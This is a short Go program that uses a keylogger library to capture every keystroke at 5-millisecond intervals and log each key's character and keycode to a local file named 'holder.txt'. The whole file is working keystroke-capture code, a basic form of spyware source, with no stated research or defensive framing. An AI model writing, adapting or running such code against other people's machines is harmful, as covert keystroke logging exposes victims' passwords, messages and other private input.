package main

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

const (
	delayKeyfetchMS = 5
)

func main() {
	kl := keylogger.NewKeylogger()
	emptyCount := 0
	file, _ := os.Create("holder.txt")
	defer file.Close()
	sigs := make(chan os.Signal, 1)
	done := make(chan bool, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	w := bufio.NewWriter(file)
	go func() {
		<-sigs
		w.Flush()
		done <- true
	}()
	for {
		key := kl.GetKey()

		if !key.Empty {
			w.WriteString(fmt.Sprintf("'%c' %d\n", key.Rune, key.Keycode))
		}

		emptyCount++

		fmt.Printf("Empty count: %d\r", emptyCount)

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}
